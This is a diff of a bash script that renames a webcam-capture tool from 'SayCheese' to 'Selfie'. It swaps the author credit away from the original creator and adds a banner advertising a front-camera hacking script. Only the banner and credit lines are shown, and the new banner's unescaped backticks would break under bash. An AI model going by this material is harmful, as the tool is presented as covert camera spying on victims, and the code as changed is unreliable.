@@ -1,6 +1,6 @@
 #!/bin/bash
-# SayCheese v1.0
-# coded by: github.com/thelinuxchoice/saycheese
+# Selfie v1.0
+# coded by: github.com/wisnusaputra123/selfie
 # If you use any part from this code, giving me the credits. Read the Lincense!
 
 trap 'printf "\n";stop' 2
@@ -8,14 +8,13 @@ trap 'printf "\n";stop' 2
 banner() {
 
 
-printf "\e[1;92m  ____              \e[0m\e[1;77m ____ _                          \e[0m\n"
-printf "\e[1;92m / ___|  __ _ _   _ \e[0m\e[1;77m/ ___| |__   ___  ___  ___  ___  \e[0m\n"
-printf "\e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
-printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
-printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
-printf "\e[1;92m              |___/ \e[0m                                 \n"
-
-printf " \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
+printf "\e[1;92m  | | ____ _ _ __ ___   ___ _ __ __ _  \e[0m\e[1;77m  _       _           _\e[0m\n"
+printf "\e[1;92m  | |/ / _` | '_ ` _ \ / _ \ '__/ _` | \e[0m\e[1;77m (_) __ _| |__   __ _| |_\e[0m\n"
+printf "\e[1;92m  |   < (_| | | | | | |  __/ | | (_| | \e[0m\e[1;77m | |/ _` | '_ \ / _` | __|\e[0m\n"
+printf "\e[1;92m  |_|\_\__,_|_| |_| |_|\___|_|  \__,_| \e[0m\e[1;77m | | (_| | | | | (_| | |_\e[0m\n"
+printf "\e[1;92m             im hacker                 \e[0m\e[1;77m_/ |\__,_|_| |_|\__,_|\__|\e[0m\n"
+printf "\e[1;92m     [* Script Hack Kamera Depan *]                |__/                        \e[0m\n"                 
+printf "\e[1;77m v1.0 coded by github.com/wisnusaputra123/selfie                               \e[0m \n"
 
 printf "\n"
 
